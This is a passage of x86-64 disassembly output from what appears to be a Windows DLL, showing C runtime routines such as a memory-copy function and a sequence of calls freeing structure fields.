   180007326:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   18000732c:	eb 13                	jmp    0x180007341
   18000732e:	e8 f1 ea ff ff       	call   0x180005e24
   180007333:	48 8b d8             	mov    %rax,%rbx
   180007336:	48 85 c0             	test   %rax,%rax
   180007339:	74 0f                	je     0x18000734a
   18000733b:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   180007341:	48 83 c3 10          	add    $0x10,%rbx
   180007345:	eb 03                	jmp    0x18000734a
   180007347:	48 8b df             	mov    %rdi,%rbx
   18000734a:	48 85 db             	test   %rbx,%rbx
   18000734d:	74 88                	je     0x1800072d7
   18000734f:	4d 8b c4             	mov    %r12,%r8
   180007352:	33 d2                	xor    %edx,%edx
   180007354:	48 8b cb             	mov    %rbx,%rcx
   180007357:	4d 03 c0             	add    %r8,%r8
   18000735a:	e8 91 9e ff ff       	call   0x1800011f0
   18000735f:	45 8b cd             	mov    %r13d,%r9d
   180007362:	4d 8b c6             	mov    %r14,%r8
   180007365:	ba 01 00 00 00       	mov    $0x1,%edx
   18000736a:	8b ce                	mov    %esi,%ecx
   18000736c:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   180007371:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180007376:	ff 15 8c 1e 00 00    	call   *0x1e8c(%rip)        # 0x180009208
   18000737c:	85 c0                	test   %eax,%eax
   18000737e:	74 15                	je     0x180007395
   180007380:	4c 8b 4d 60          	mov    0x60(%rbp),%r9
   180007384:	44 8b c0             	mov    %eax,%r8d
   180007387:	48 8b d3             	mov    %rbx,%rdx
   18000738a:	41 8b cf             	mov    %r15d,%ecx
   18000738d:	ff 15 85 1e 00 00    	call   *0x1e85(%rip)        # 0x180009218
   180007393:	8b f8                	mov    %eax,%edi
   180007395:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   180007399:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   18000739f:	75 05                	jne    0x1800073a6
   1800073a1:	e8 12 b9 ff ff       	call   0x180002cb8
   1800073a6:	8b c7                	mov    %edi,%eax
   1800073a8:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
   1800073ac:	48 33 cd             	xor    %rbp,%rcx
   1800073af:	e8 ac e6 ff ff       	call   0x180005a60
   1800073b4:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   1800073b8:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   1800073bc:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   1800073c0:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   1800073c4:	41 5f                	pop    %r15
   1800073c6:	41 5e                	pop    %r14
   1800073c8:	41 5d                	pop    %r13
   1800073ca:	41 5c                	pop    %r12
   1800073cc:	5d                   	pop    %rbp
   1800073cd:	c3                   	ret
   1800073ce:	cc                   	int3
   1800073cf:	cc                   	int3
   1800073d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800073d5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800073da:	57                   	push   %rdi
   1800073db:	48 83 ec 60          	sub    $0x60,%rsp
   1800073df:	8b f2                	mov    %edx,%esi
   1800073e1:	48 8b d1             	mov    %rcx,%rdx
   1800073e4:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800073e9:	41 8b d9             	mov    %r9d,%ebx
   1800073ec:	49 8b f8             	mov    %r8,%rdi
   1800073ef:	e8 c8 a3 ff ff       	call   0x1800017bc
   1800073f4:	44 8b 9c 24 a8 00 00 	mov    0xa8(%rsp),%r11d
   1800073fb:	00 
   1800073fc:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   180007403:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180007408:	44 89 5c 24 30       	mov    %r11d,0x30(%rsp)
   18000740d:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180007411:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   180007418:	00 
   180007419:	44 8b cb             	mov    %ebx,%r9d
   18000741c:	4c 8b c7             	mov    %rdi,%r8
   18000741f:	8b d6                	mov    %esi,%edx
   180007421:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180007426:	e8 45 fe ff ff       	call   0x180007270
   18000742b:	80 7c 24 58 00       	cmpb   $0x0,0x58(%rsp)
   180007430:	74 0c                	je     0x18000743e
   180007432:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   180007437:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   18000743e:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   180007443:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   180007448:	48 83 c4 60          	add    $0x60,%rsp
   18000744c:	5f                   	pop    %rdi
   18000744d:	c3                   	ret
   18000744e:	cc                   	int3
   18000744f:	cc                   	int3
   180007450:	cc                   	int3
   180007451:	cc                   	int3
   180007452:	cc                   	int3
   180007453:	cc                   	int3
   180007454:	cc                   	int3
   180007455:	cc                   	int3
   180007456:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000745d:	00 00 00 
   180007460:	4c 8b d9             	mov    %rcx,%r11
   180007463:	48 2b d1             	sub    %rcx,%rdx
   180007466:	0f 82 9e 01 00 00    	jb     0x18000760a
   18000746c:	49 83 f8 08          	cmp    $0x8,%r8
   180007470:	72 61                	jb     0x1800074d3
   180007472:	f6 c1 07             	test   $0x7,%cl
   180007475:	74 36                	je     0x1800074ad
   180007477:	f6 c1 01             	test   $0x1,%cl
   18000747a:	74 0b                	je     0x180007487
   18000747c:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   18000747f:	49 ff c8             	dec    %r8
   180007482:	88 01                	mov    %al,(%rcx)
   180007484:	48 ff c1             	inc    %rcx
   180007487:	f6 c1 02             	test   $0x2,%cl
   18000748a:	74 0f                	je     0x18000749b
   18000748c:	66 8b 04 0a          	mov    (%rdx,%rcx,1),%ax
   180007490:	49 83 e8 02          	sub    $0x2,%r8
   180007494:	66 89 01             	mov    %ax,(%rcx)
   180007497:	48 83 c1 02          	add    $0x2,%rcx
   18000749b:	f6 c1 04             	test   $0x4,%cl
   18000749e:	74 0d                	je     0x1800074ad
   1800074a0:	8b 04 0a             	mov    (%rdx,%rcx,1),%eax
   1800074a3:	49 83 e8 04          	sub    $0x4,%r8
   1800074a7:	89 01                	mov    %eax,(%rcx)
   1800074a9:	48 83 c1 04          	add    $0x4,%rcx
   1800074ad:	4d 8b c8             	mov    %r8,%r9
   1800074b0:	49 c1 e9 05          	shr    $0x5,%r9
   1800074b4:	75 51                	jne    0x180007507
   1800074b6:	4d 8b c8             	mov    %r8,%r9
   1800074b9:	49 c1 e9 03          	shr    $0x3,%r9
   1800074bd:	74 14                	je     0x1800074d3
   1800074bf:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   1800074c3:	48 89 01             	mov    %rax,(%rcx)
   1800074c6:	48 83 c1 08          	add    $0x8,%rcx
   1800074ca:	49 ff c9             	dec    %r9
   1800074cd:	75 f0                	jne    0x1800074bf
   1800074cf:	49 83 e0 07          	and    $0x7,%r8
   1800074d3:	4d 85 c0             	test   %r8,%r8
   1800074d6:	75 08                	jne    0x1800074e0
   1800074d8:	49 8b c3             	mov    %r11,%rax
   1800074db:	c3                   	ret
   1800074dc:	0f 1f 40 00          	nopl   0x0(%rax)
   1800074e0:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   1800074e3:	88 01                	mov    %al,(%rcx)
   1800074e5:	48 ff c1             	inc    %rcx
   1800074e8:	49 ff c8             	dec    %r8
   1800074eb:	75 f3                	jne    0x1800074e0
   1800074ed:	49 8b c3             	mov    %r11,%rax
   1800074f0:	c3                   	ret
   1800074f1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1800074f8:	0f 1f 84 00 00 00 00 
   1800074ff:	00 
   180007500:	66 66 66 90          	data16 data16 xchg %ax,%ax
   180007504:	66 66 90             	data16 xchg %ax,%ax
   180007507:	49 81 f9 00 20 00 00 	cmp    $0x2000,%r9
   18000750e:	73 42                	jae    0x180007552
   180007510:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   180007514:	4c 8b 54 0a 08       	mov    0x8(%rdx,%rcx,1),%r10
   180007519:	48 83 c1 20          	add    $0x20,%rcx
   18000751d:	48 89 41 e0          	mov    %rax,-0x20(%rcx)
   180007521:	4c 89 51 e8          	mov    %r10,-0x18(%rcx)
   180007525:	48 8b 44 0a f0       	mov    -0x10(%rdx,%rcx,1),%rax
   18000752a:	4c 8b 54 0a f8       	mov    -0x8(%rdx,%rcx,1),%r10
   18000752f:	49 ff c9             	dec    %r9
   180007532:	48 89 41 f0          	mov    %rax,-0x10(%rcx)
   180007536:	4c 89 51 f8          	mov    %r10,-0x8(%rcx)
   18000753a:	75 d4                	jne    0x180007510
   18000753c:	49 83 e0 1f          	and    $0x1f,%r8
   180007540:	e9 71 ff ff ff       	jmp    0x1800074b6
   180007545:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   18000754c:	00 00 00 00 
   180007550:	66 90                	xchg   %ax,%ax
   180007552:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180007559:	72 b5                	jb     0x180007510
   18000755b:	b8 20 00 00 00       	mov    $0x20,%eax
   180007560:	0f 18 04 0a          	prefetchnta (%rdx,%rcx,1)
   180007564:	0f 18 44 0a 40       	prefetchnta 0x40(%rdx,%rcx,1)
   180007569:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   180007570:	ff c8                	dec    %eax
   180007572:	75 ec                	jne    0x180007560
   180007574:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   18000757b:	b8 40 00 00 00       	mov    $0x40,%eax
   180007580:	4c 8b 0c 0a          	mov    (%rdx,%rcx,1),%r9
   180007584:	4c 8b 54 0a 08       	mov    0x8(%rdx,%rcx,1),%r10
   180007589:	4c 0f c3 09          	movnti %r9,(%rcx)
   18000758d:	4c 0f c3 51 08       	movnti %r10,0x8(%rcx)
   180007592:	4c 8b 4c 0a 10       	mov    0x10(%rdx,%rcx,1),%r9
   180007597:	4c 8b 54 0a 18       	mov    0x18(%rdx,%rcx,1),%r10
   18000759c:	4c 0f c3 49 10       	movnti %r9,0x10(%rcx)
   1800075a1:	4c 0f c3 51 18       	movnti %r10,0x18(%rcx)
   1800075a6:	4c 8b 4c 0a 20       	mov    0x20(%rdx,%rcx,1),%r9
   1800075ab:	4c 8b 54 0a 28       	mov    0x28(%rdx,%rcx,1),%r10
   1800075b0:	48 83 c1 40          	add    $0x40,%rcx
   1800075b4:	4c 0f c3 49 e0       	movnti %r9,-0x20(%rcx)
   1800075b9:	4c 0f c3 51 e8       	movnti %r10,-0x18(%rcx)
   1800075be:	4c 8b 4c 0a f0       	mov    -0x10(%rdx,%rcx,1),%r9
   1800075c3:	4c 8b 54 0a f8       	mov    -0x8(%rdx,%rcx,1),%r10
   1800075c8:	ff c8                	dec    %eax
   1800075ca:	4c 0f c3 49 f0       	movnti %r9,-0x10(%rcx)
   1800075cf:	4c 0f c3 51 f8       	movnti %r10,-0x8(%rcx)
   1800075d4:	75 aa                	jne    0x180007580
   1800075d6:	49 81 e8 00 10 00 00 	sub    $0x1000,%r8
   1800075dd:	49 81 f8 00 10 00 00 	cmp    $0x1000,%r8
   1800075e4:	0f 83 71 ff ff ff    	jae    0x18000755b
   1800075ea:	f0 80 0c 24 00       	lock orb $0x0,(%rsp)
   1800075ef:	e9 b9 fe ff ff       	jmp    0x1800074ad
   1800075f4:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1800075fb:	00 00 00 00 00 
   180007600:	66 66 66 90          	data16 data16 xchg %ax,%ax
   180007604:	66 66 66 90          	data16 data16 xchg %ax,%ax
   180007608:	66 90                	xchg   %ax,%ax
   18000760a:	49 03 c8             	add    %r8,%rcx
   18000760d:	49 83 f8 08          	cmp    $0x8,%r8
   180007611:	72 61                	jb     0x180007674
   180007613:	f6 c1 07             	test   $0x7,%cl
   180007616:	74 36                	je     0x18000764e
   180007618:	f6 c1 01             	test   $0x1,%cl
   18000761b:	74 0b                	je     0x180007628
   18000761d:	48 ff c9             	dec    %rcx
   180007620:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   180007623:	49 ff c8             	dec    %r8
   180007626:	88 01                	mov    %al,(%rcx)
   180007628:	f6 c1 02             	test   $0x2,%cl
   18000762b:	74 0f                	je     0x18000763c
   18000762d:	48 83 e9 02          	sub    $0x2,%rcx
   180007631:	66 8b 04 0a          	mov    (%rdx,%rcx,1),%ax
   180007635:	49 83 e8 02          	sub    $0x2,%r8
   180007639:	66 89 01             	mov    %ax,(%rcx)
   18000763c:	f6 c1 04             	test   $0x4,%cl
   18000763f:	74 0d                	je     0x18000764e
   180007641:	48 83 e9 04          	sub    $0x4,%rcx
   180007645:	8b 04 0a             	mov    (%rdx,%rcx,1),%eax
   180007648:	49 83 e8 04          	sub    $0x4,%r8
   18000764c:	89 01                	mov    %eax,(%rcx)
   18000764e:	4d 8b c8             	mov    %r8,%r9
   180007651:	49 c1 e9 05          	shr    $0x5,%r9
   180007655:	75 50                	jne    0x1800076a7
   180007657:	4d 8b c8             	mov    %r8,%r9
   18000765a:	49 c1 e9 03          	shr    $0x3,%r9
   18000765e:	74 14                	je     0x180007674
   180007660:	48 83 e9 08          	sub    $0x8,%rcx
   180007664:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   180007668:	49 ff c9             	dec    %r9
   18000766b:	48 89 01             	mov    %rax,(%rcx)
   18000766e:	75 f0                	jne    0x180007660
   180007670:	49 83 e0 07          	and    $0x7,%r8
   180007674:	4d 85 c0             	test   %r8,%r8
   180007677:	75 07                	jne    0x180007680
   180007679:	49 8b c3             	mov    %r11,%rax
   18000767c:	c3                   	ret
   18000767d:	0f 1f 00             	nopl   (%rax)
   180007680:	48 ff c9             	dec    %rcx
   180007683:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   180007686:	49 ff c8             	dec    %r8
   180007689:	88 01                	mov    %al,(%rcx)
   18000768b:	75 f3                	jne    0x180007680
   18000768d:	49 8b c3             	mov    %r11,%rax
   180007690:	c3                   	ret
   180007691:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   180007698:	0f 1f 84 00 00 00 00 
   18000769f:	00 
   1800076a0:	66 66 66 90          	data16 data16 xchg %ax,%ax
   1800076a4:	66 66 90             	data16 xchg %ax,%ax
   1800076a7:	49 81 f9 00 20 00 00 	cmp    $0x2000,%r9
   1800076ae:	73 42                	jae    0x1800076f2
   1800076b0:	48 8b 44 0a f8       	mov    -0x8(%rdx,%rcx,1),%rax
   1800076b5:	4c 8b 54 0a f0       	mov    -0x10(%rdx,%rcx,1),%r10
   1800076ba:	48 83 e9 20          	sub    $0x20,%rcx
   1800076be:	48 89 41 18          	mov    %rax,0x18(%rcx)
   1800076c2:	4c 89 51 10          	mov    %r10,0x10(%rcx)
   1800076c6:	48 8b 44 0a 08       	mov    0x8(%rdx,%rcx,1),%rax
   1800076cb:	4c 8b 14 0a          	mov    (%rdx,%rcx,1),%r10
   1800076cf:	49 ff c9             	dec    %r9
   1800076d2:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1800076d6:	4c 89 11             	mov    %r10,(%rcx)
   1800076d9:	75 d5                	jne    0x1800076b0
   1800076db:	49 83 e0 1f          	and    $0x1f,%r8
   1800076df:	e9 73 ff ff ff       	jmp    0x180007657
   1800076e4:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1800076eb:	00 00 00 00 00 
   1800076f0:	66 90                	xchg   %ax,%ax
   1800076f2:	48 81 fa 00 f0 ff ff 	cmp    $0xfffffffffffff000,%rdx
   1800076f9:	77 b5                	ja     0x1800076b0
   1800076fb:	b8 20 00 00 00       	mov    $0x20,%eax
   180007700:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   180007707:	0f 18 04 0a          	prefetchnta (%rdx,%rcx,1)
   18000770b:	0f 18 44 0a 40       	prefetchnta 0x40(%rdx,%rcx,1)
   180007710:	ff c8                	dec    %eax
   180007712:	75 ec                	jne    0x180007700
   180007714:	48 81 c1 00 10 00 00 	add    $0x1000,%rcx
   18000771b:	b8 40 00 00 00       	mov    $0x40,%eax
   180007720:	4c 8b 4c 0a f8       	mov    -0x8(%rdx,%rcx,1),%r9
   180007725:	4c 8b 54 0a f0       	mov    -0x10(%rdx,%rcx,1),%r10
   18000772a:	4c 0f c3 49 f8       	movnti %r9,-0x8(%rcx)
   18000772f:	4c 0f c3 51 f0       	movnti %r10,-0x10(%rcx)
   180007734:	4c 8b 4c 0a e8       	mov    -0x18(%rdx,%rcx,1),%r9
   180007739:	4c 8b 54 0a e0       	mov    -0x20(%rdx,%rcx,1),%r10
   18000773e:	4c 0f c3 49 e8       	movnti %r9,-0x18(%rcx)
   180007743:	4c 0f c3 51 e0       	movnti %r10,-0x20(%rcx)
   180007748:	4c 8b 4c 0a d8       	mov    -0x28(%rdx,%rcx,1),%r9
   18000774d:	4c 8b 54 0a d0       	mov    -0x30(%rdx,%rcx,1),%r10
   180007752:	48 83 e9 40          	sub    $0x40,%rcx
   180007756:	4c 0f c3 49 18       	movnti %r9,0x18(%rcx)
   18000775b:	4c 0f c3 51 10       	movnti %r10,0x10(%rcx)
   180007760:	4c 8b 4c 0a 08       	mov    0x8(%rdx,%rcx,1),%r9
   180007765:	4c 8b 14 0a          	mov    (%rdx,%rcx,1),%r10
   180007769:	ff c8                	dec    %eax
   18000776b:	4c 0f c3 49 08       	movnti %r9,0x8(%rcx)
   180007770:	4c 0f c3 11          	movnti %r10,(%rcx)
   180007774:	75 aa                	jne    0x180007720
   180007776:	49 81 e8 00 10 00 00 	sub    $0x1000,%r8
   18000777d:	49 81 f8 00 10 00 00 	cmp    $0x1000,%r8
   180007784:	0f 83 71 ff ff ff    	jae    0x1800076fb
   18000778a:	f0 80 0c 24 00       	lock orb $0x0,(%rsp)
   18000778f:	e9 ba fe ff ff       	jmp    0x18000764e
   180007794:	48 85 c9             	test   %rcx,%rcx
   180007797:	0f 84 e4 03 00 00    	je     0x180007b81
   18000779d:	53                   	push   %rbx
   18000779e:	48 83 ec 20          	sub    $0x20,%rsp
   1800077a2:	48 8b d9             	mov    %rcx,%rbx
   1800077a5:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1800077a9:	e8 0a b5 ff ff       	call   0x180002cb8
   1800077ae:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   1800077b2:	e8 01 b5 ff ff       	call   0x180002cb8
   1800077b7:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   1800077bb:	e8 f8 b4 ff ff       	call   0x180002cb8
   1800077c0:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   1800077c4:	e8 ef b4 ff ff       	call   0x180002cb8
   1800077c9:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   1800077cd:	e8 e6 b4 ff ff       	call   0x180002cb8
   1800077d2:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   1800077d6:	e8 dd b4 ff ff       	call   0x180002cb8
   1800077db:	48 8b 0b             	mov    (%rbx),%rcx
   1800077de:	e8 d5 b4 ff ff       	call   0x180002cb8
   1800077e3:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   1800077e7:	e8 cc b4 ff ff       	call   0x180002cb8
   1800077ec:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   1800077f0:	e8 c3 b4 ff ff       	call   0x180002cb8
   1800077f5:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   1800077f9:	e8 ba b4 ff ff       	call   0x180002cb8
   1800077fe:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   180007802:	e8 b1 b4 ff ff       	call   0x180002cb8
   180007807:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   18000780b:	e8 a8 b4 ff ff       	call   0x180002cb8
   180007810:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   180007814:	e8 9f b4 ff ff       	call   0x180002cb8
   180007819:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   18000781d:	e8 96 b4 ff ff       	call   0x180002cb8
   180007822:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   180007826:	e8 8d b4 ff ff       	call   0x180002cb8
   18000782b:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   18000782f:	e8 84 b4 ff ff       	call   0x180002cb8
   180007834:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   18000783b:	e8 78 b4 ff ff       	call   0x180002cb8
   180007840:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   180007847:	e8 6c b4 ff ff       	call   0x180002cb8
   18000784c:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   180007853:	e8 60 b4 ff ff       	call   0x180002cb8
   180007858:	48 8b 8b 98 00 00 00 	mov    0x98(%rbx),%rcx
   18000785f:	e8 54 b4 ff ff       	call   0x180002cb8
   180007864:	48 8b 8b a0 00 00 00 	mov    0xa0(%rbx),%rcx
   18000786b:	e8 48 b4 ff ff       	call   0x180002cb8
   180007870:	48 8b 8b a8 00 00 00 	mov    0xa8(%rbx),%rcx
   180007877:	e8 3c b4 ff ff       	call   0x180002cb8
   18000787c:	48 8b 8b b0 00 00 00 	mov    0xb0(%rbx),%rcx
   180007883:	e8 30 b4 ff ff       	call   0x180002cb8
   180007888:	48 8b 8b b8 00 00 00 	mov    0xb8(%rbx),%rcx
   18000788f:	e8 24 b4 ff ff       	call   0x180002cb8
   180007894:	48 8b 8b c0 00 00 00 	mov    0xc0(%rbx),%rcx
   18000789b:	e8 18 b4 ff ff       	call   0x180002cb8
   1800078a0:	48 8b 8b c8 00 00 00 	mov    0xc8(%rbx),%rcx
   1800078a7:	e8 0c b4 ff ff       	call   0x180002cb8
   1800078ac:	48 8b 8b d0 00 00 00 	mov    0xd0(%rbx),%rcx
   1800078b3:	e8 00 b4 ff ff       	call   0x180002cb8
   1800078b8:	48 8b 8b d8 00 00 00 	mov    0xd8(%rbx),%rcx
   1800078bf:	e8 f4 b3 ff ff       	call   0x180002cb8
   1800078c4:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   1800078cb:	e8 e8 b3 ff ff       	call   0x180002cb8
   1800078d0:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   1800078d7:	e8 dc b3 ff ff       	call   0x180002cb8
   1800078dc:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   1800078e3:	e8 d0 b3 ff ff       	call   0x180002cb8
   1800078e8:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   1800078ef:	e8 c4 b3 ff ff       	call   0x180002cb8
   1800078f4:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   1800078fb:	e8 b8 b3 ff ff       	call   0x180002cb8
   180007900:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   180007907:	e8 ac b3 ff ff       	call   0x180002cb8
   18000790c:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   180007913:	e8 a0 b3 ff ff       	call   0x180002cb8
   180007918:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   18000791f:	e8 94 b3 ff ff       	call   0x180002cb8
   180007924:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   18000792b:	e8 88 b3 ff ff       	call   0x180002cb8
   180007930:	48 8b 8b 28 01 00 00 	mov    0x128(%rbx),%rcx
   180007937:	e8 7c b3 ff ff       	call   0x180002cb8
   18000793c:	48 8b 8b 30 01 00 00 	mov    0x130(%rbx),%rcx
   180007943:	e8 70 b3 ff ff       	call   0x180002cb8
   180007948:	48 8b 8b 38 01 00 00 	mov    0x138(%rbx),%rcx
   18000794f:	e8 64 b3 ff ff       	call   0x180002cb8
   180007954:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   18000795b:	e8 58 b3 ff ff       	call   0x180002cb8
   180007960:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   180007967:	e8 4c b3 ff ff       	call   0x180002cb8
   18000796c:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   180007973:	e8 40 b3 ff ff       	call   0x180002cb8
   180007978:	48 8b 8b 70 01 00 00 	mov    0x170(%rbx),%rcx
   18000797f:	e8 34 b3 ff ff       	call   0x180002cb8
   180007984:	48 8b 8b 78 01 00 00 	mov    0x178(%rbx),%rcx
   18000798b:	e8 28 b3 ff ff       	call   0x180002cb8
   180007990:	48 8b 8b 80 01 00 00 	mov    0x180(%rbx),%rcx
   180007997:	e8 1c b3 ff ff       	call   0x180002cb8
   18000799c:	48 8b 8b 88 01 00 00 	mov    0x188(%rbx),%rcx
   1800079a3:	e8 10 b3 ff ff       	call   0x180002cb8
   1800079a8:	48 8b 8b 90 01 00 00 	mov    0x190(%rbx),%rcx
   1800079af:	e8 04 b3 ff ff       	call   0x180002cb8
   1800079b4:	48 8b 8b 98 01 00 00 	mov    0x198(%rbx),%rcx
   1800079bb:	e8 f8 b2 ff ff       	call   0x180002cb8
   1800079c0:	48 8b 8b 68 01 00 00 	mov    0x168(%rbx),%rcx
   1800079c7:	e8 ec b2 ff ff       	call   0x180002cb8
   1800079cc:	48 8b 8b a8 01 00 00 	mov    0x1a8(%rbx),%rcx
   1800079d3:	e8 e0 b2 ff ff       	call   0x180002cb8
   1800079d8:	48 8b 8b b0 01 00 00 	mov    0x1b0(%rbx),%rcx
   1800079df:	e8 d4 b2 ff ff       	call   0x180002cb8
   1800079e4:	48 8b 8b b8 01 00 00 	mov    0x1b8(%rbx),%rcx
   1800079eb:	e8 c8 b2 ff ff       	call   0x180002cb8
   1800079f0:	48 8b 8b c0 01 00 00 	mov    0x1c0(%rbx),%rcx
   1800079f7:	e8 bc b2 ff ff       	call   0x180002cb8
   1800079fc:	48 8b 8b c8 01 00 00 	mov    0x1c8(%rbx),%rcx
   180007a03:	e8 b0 b2 ff ff       	call   0x180002cb8
   180007a08:	48 8b 8b d0 01 00 00 	mov    0x1d0(%rbx),%rcx
   180007a0f:	e8 a4 b2 ff ff       	call   0x180002cb8
   180007a14:	48 8b 8b a0 01 00 00 	mov    0x1a0(%rbx),%rcx
   180007a1b:	e8 98 b2 ff ff       	call   0x180002cb8
   180007a20:	48 8b 8b d8 01 00 00 	mov    0x1d8(%rbx),%rcx
   180007a27:	e8 8c b2 ff ff       	call   0x180002cb8
   180007a2c:	48 8b 8b e0 01 00 00 	mov    0x1e0(%rbx),%rcx
   180007a33:	e8 80 b2 ff ff       	call   0x180002cb8
   180007a38:	48 8b 8b e8 01 00 00 	mov    0x1e8(%rbx),%rcx
   180007a3f:	e8 74 b2 ff ff       	call   0x180002cb8
   180007a44:	48 8b 8b f0 01 00 00 	mov    0x1f0(%rbx),%rcx
   180007a4b:	e8 68 b2 ff ff       	call   0x180002cb8
   180007a50:	48 8b 8b f8 01 00 00 	mov    0x1f8(%rbx),%rcx
   180007a57:	e8 5c b2 ff ff       	call   0x180002cb8
   180007a5c:	48 8b 8b 00 02 00 00 	mov    0x200(%rbx),%rcx
   180007a63:	e8 50 b2 ff ff       	call   0x180002cb8
   180007a68:	48 8b 8b 08 02 00 00 	mov    0x208(%rbx),%rcx
   180007a6f:	e8 44 b2 ff ff       	call   0x180002cb8
   180007a74:	48 8b 8b 10 02 00 00 	mov    0x210(%rbx),%rcx
   180007a7b:	e8 38 b2 ff ff       	call   0x180002cb8
   180007a80:	48 8b 8b 18 02 00 00 	mov    0x218(%rbx),%rcx
   180007a87:	e8 2c b2 ff ff       	call   0x180002cb8
   180007a8c:	48 8b 8b 20 02 00 00 	mov    0x220(%rbx),%rcx
   180007a93:	e8 20 b2 ff ff       	call   0x180002cb8
   180007a98:	48 8b 8b 28 02 00 00 	mov    0x228(%rbx),%rcx
   180007a9f:	e8 14 b2 ff ff       	call   0x180002cb8
   180007aa4:	48 8b 8b 30 02 00 00 	mov    0x230(%rbx),%rcx
   180007aab:	e8 08 b2 ff ff       	call   0x180002cb8
   180007ab0:	48 8b 8b 38 02 00 00 	mov    0x238(%rbx),%rcx
   180007ab7:	e8 fc b1 ff ff       	call   0x180002cb8
   180007abc:	48 8b 8b 40 02 00 00 	mov    0x240(%rbx),%rcx
   180007ac3:	e8 f0 b1 ff ff       	call   0x180002cb8
   180007ac8:	48 8b 8b 48 02 00 00 	mov    0x248(%rbx),%rcx
   180007acf:	e8 e4 b1 ff ff       	call   0x180002cb8
   180007ad4:	48 8b 8b 50 02 00 00 	mov    0x250(%rbx),%rcx
   180007adb:	e8 d8 b1 ff ff       	call   0x180002cb8
   180007ae0:	48 8b 8b 58 02 00 00 	mov    0x258(%rbx),%rcx
   180007ae7:	e8 cc b1 ff ff       	call   0x180002cb8
   180007aec:	48 8b 8b 60 02 00 00 	mov    0x260(%rbx),%rcx
   180007af3:	e8 c0 b1 ff ff       	call   0x180002cb8
   180007af8:	48 8b 8b 68 02 00 00 	mov    0x268(%rbx),%rcx
   180007aff:	e8 b4 b1 ff ff       	call   0x180002cb8
   180007b04:	48 8b 8b 70 02 00 00 	mov    0x270(%rbx),%rcx
   180007b0b:	e8 a8 b1 ff ff       	call   0x180002cb8
   180007b10:	48 8b 8b 78 02 00 00 	mov    0x278(%rbx),%rcx
   180007b17:	e8 9c b1 ff ff       	call   0x180002cb8
   180007b1c:	48 8b 8b 80 02 00 00 	mov    0x280(%rbx),%rcx
